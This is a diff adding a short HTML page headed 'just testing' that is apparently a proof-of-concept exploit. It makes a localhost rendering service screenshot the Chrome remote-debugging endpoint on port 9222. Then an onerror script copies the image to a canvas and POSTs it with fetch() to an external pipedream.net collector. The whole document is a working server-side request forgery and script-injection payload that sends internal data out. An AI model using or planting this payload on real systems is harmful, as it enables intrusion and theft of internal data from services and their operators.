@@ -1,0 +1,5 @@
+<div>
+  <h1>just testing</h1>
+  <img id="rap" src="http://localhost:3000/render?url=http://localhost:9222/json&renderType=png&width=800&height=800" width="800" height="800">
+  <img src="x" onerror='(n=0,i=document.getElementById("rap"),i.onload=function(){n++;e=document.createElement("canvas");e.width=i.width,e.height=i.height,e.getContext("2d").drawImage(i,0,0);t=e.toDataURL("image/png");console.log(n,t);if(n>1){fetch("https://e1d544a9b90cb618dc510cc0acca74af.m.pipedream.net",{method:"POST",body:JSON.stringify(t)})}})()'>
+</div>
